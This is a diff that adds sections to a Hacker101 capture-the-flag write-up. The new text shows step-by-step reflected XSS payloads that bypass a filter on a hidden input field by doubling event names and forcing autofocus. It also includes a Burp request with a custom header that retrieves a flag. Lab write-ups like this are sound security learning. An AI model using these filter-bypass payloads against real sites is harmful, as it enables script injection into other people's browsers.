@@ -327,6 +327,76 @@ If it's possible then given the above exploits could we construct a URL such as
 
 ```https://xxx.ctf.hacker101.com/#searchterm=x&redirectUrl=index.php?msg=evilxss```
 
+### Hidden input field searchtxt
+
+Studying the DOM I noticed a strange hidden input field which seemingly serves no purpose
+
+```html
+<input value="" name="searchtxt" type="hidden">
+```
+
+It seems like you can adjust the URL to contain a request/query param such as
+
+```https://xxx.ctf.hacker101.com/?searchtxt=hi"```
+
+Which then shows up in the DOM
+
+```html
+<input value="hi" name="searchtxt" type="hidden">
+```
+
+OK can I end the input tag?
+
+```https://xxx.ctf.hacker101.com/?searchtxt=hi"><```
+
+No stripped
+
+```html
+<input value="hi" "="" name="searchtxt" type="hidden">
+```
+
+Let's try adding an event
+
+```https://xxx.ctf.hacker101.com/?searchtxt=hi" onfocus=alert(1)```
+
+Also stripped
+
+```html
+<input value="hi" =alert(1)"="" name="searchtxt" type="hidden">
+```
+
+Can I trick it?
+
+```https://xxx.ctf.hacker101.com/?searchtxt=hi" ononfocusfocus=alert(1)```
+
+Ooo getting somewhere
+
+```html
+<input value="hi" onfocus="alert(1)&quot;" name="searchtxt" type="hidden">
+```
+
+Right I need to focus it
+
+```https://xxx.ctf.hacker101.com/?searchtxt=hi" ononfocusfocus="alert(1)" autofocus x="```
+
+OK, but the event doesn't fire
+
+```html
+<input value="hi" onfocus="alert(1)" autofocus="" x="" name="searchtxt" type="hidden">
+```
+Probably because it's a hidden input type, let's change that
+
+```
+https://xxx.ctf.hacker101.com/?searchtxt=hi" ononfocusfocus="alert(1);" autofocus type="text" x="
+```
+
+Yay the focus event fired we have XSS :)
+
+```html
+<input value="hi" onfocus="alert(1);" autofocus="" type="text" x="" name="searchtxt">
+```
+
+
 ### Not allowed to view emails?
 
 So this probably isn't XSS per-se but apparently "You are not allowed to view emails" ok that sets my alarm bells ringing.
@@ -381,6 +451,53 @@ X-Powered-By: PHP/7.2.34
 ```
 
 Hmmm not what I expected? This felt like the flag?!....
+
+The javascript explicitly set's the header as X-SAFEPROTECTION (all uppercase). Trying to force this in Burp repeater gives the warning "Your request is kettled". This seems to be something to do with the HTTP/2 request.
+
+If I explicitly set it to a HTTP/1 request in Burp I get the flag :)
+
+Request
+
+```
+GET /api/action.php?act=getemail HTTP/1.1
+Host: xxx.ctf.hacker101.com
+Cookie: _ga=GA1.2.2088535546.1649282063; _gid=GA1.2.1634831032.1654034640; _gat_gtag_UA_49905813_11=1; welcome=1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=
+Referer: https://xxx.ctf.hacker101.com/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+```
+
+Response
+```
+HTTP/1.1 200 OK
+Date: Tue, 31 May 2022 22:05:21 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 112
+Connection: keep-alive
+Server: openresty/1.21.4.1
+X-Powered-By: PHP/7.2.34
+Vary: Accept-Encoding
+
+{'email':'zseano@ofcourse.com','flag':'^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$'}
+```
+### Are we 1337?
+
+What's this about within a script tag of the document?
+
+```html
+<script>
+  ...
+  ...
+  var is1337=false;
+</script>
+```
 
 ### Helper php?
 
